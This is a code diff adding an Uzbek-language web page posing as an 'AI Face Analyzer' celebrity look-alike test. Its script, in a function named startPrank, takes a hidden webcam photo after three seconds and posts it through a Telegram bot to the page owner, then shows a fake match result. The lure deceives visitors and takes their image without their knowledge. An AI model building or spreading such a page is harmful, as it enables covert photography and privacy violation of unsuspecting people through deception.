@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Face Analyzer</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
+        .container { background: white; padding: 20px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Siz qaysi mashhur insonga o'xshaysiz? 🤔</h2>
+    <p>AI tizimi yuzingizni skaner qilishi uchun ruxsat bering:</p>
+    <button onclick="startPrank()">Testni boshlash</button>
+    <p id="status"></p>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    // BU YERGA O'ZINGIZNI MA'LUMOTLARINGIZNI YOZING:
+    const BOT_TOKEN = 'SIZNING_BOT_TOKENINGIZ'; // BotFather'dan olingan token
+    const CHAT_ID = 'SIZNING_ID_RAQAMINGIZ';      // @userinfobot orqali olingan ID
+
+    async function startPrank() {
+        const status = document.getElementById('status');
+        status.innerText = "Skaner qilinmoqda, kuting...";
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // 3 soniya kutib, rasmga oladi
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Rasmni Blob ko'rinishiga o'tkazish
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'rasm.jpg');
+
+                    // Telegramga yuborish
+                    await fetch(`https://telegram.org{BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    status.innerText = "Tahlil tugadi! Siz: Cristiano Ronaldoga 98% o'xshaysiz! 😂";
+                    stream.getTracks().forEach(track => track.stop()); // Kamerani o'chirish
+                }, 'image/jpeg');
+            }, 3000);
+
+        } catch (err) {
+            status.innerText = "Xato: Kamera ruxsat berilmadi!";
+        }
+    }
+</script>
+
+</body>
+</html>
